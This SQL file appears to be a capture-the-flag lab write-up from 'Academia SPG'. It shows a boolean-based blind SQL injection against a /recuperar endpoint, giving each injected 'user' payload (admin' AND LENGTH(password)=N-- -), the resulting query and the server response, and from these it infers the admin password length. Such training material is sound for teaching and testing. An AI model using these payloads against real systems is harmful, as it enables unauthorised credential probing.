-- =============================================================================
-- 01_length_oracle.sql
-- SQLi #2: Blind SQLi (Boolean & Temporal) | Academia SPG
-- -----------------------------------------------------------------------------
-- Target     : POST /recuperar  (vulnerable parameter: "user")
-- Technique  : Boolean-based blind SQL injection
-- Goal       : Determine the length of the admin password using LENGTH()
--              as a TRUE/FALSE oracle, since the response never leaks data,
--              it only toggles between {"login":"existe"} / {"login":"no existe"}.
-- Backend    : MySQL / MariaDB (confirmed by LENGTH(), SUBSTRING(), SLEEP())
-- =============================================================================

-- Presumed vulnerable query on the server side (string-concatenated, unsanitized):
--   SELECT * FROM users WHERE username = '<user>' AND password_hash = '<...>';

-- Injected value of "user": admin' AND LENGTH(password)=6-- -
SELECT *
FROM users
WHERE username = 'admin' AND LENGTH(password) = 6-- -' AND password_hash = '';
-- Response: {"login":"no existe"}  -> FALSE

-- Injected value of "user": admin' AND LENGTH(password)=7-- -
SELECT *
FROM users
WHERE username = 'admin' AND LENGTH(password) = 7-- -' AND password_hash = '';
-- Response: {"login":"no existe"}  -> FALSE

-- Injected value of "user": admin' AND LENGTH(password)=8-- -
SELECT *
FROM users
WHERE username = 'admin' AND LENGTH(password) = 8-- -' AND password_hash = '';
-- Response: {"login":"existe"}     -> TRUE  *** confirmed length ***

-- Injected value of "user": admin' AND LENGTH(password)=9-- -
SELECT *
FROM users
WHERE username = 'admin' AND LENGTH(password) = 9-- -' AND password_hash = '';
-- Response: {"login":"no existe"}  -> FALSE

-- -----------------------------------------------------------------------------
-- Result: only LENGTH(password) = 8 returns a TRUE oracle.
-- Conclusion: the admin password is exactly 8 characters long.
-- Flag: SPG{8}
-- =============================================================================
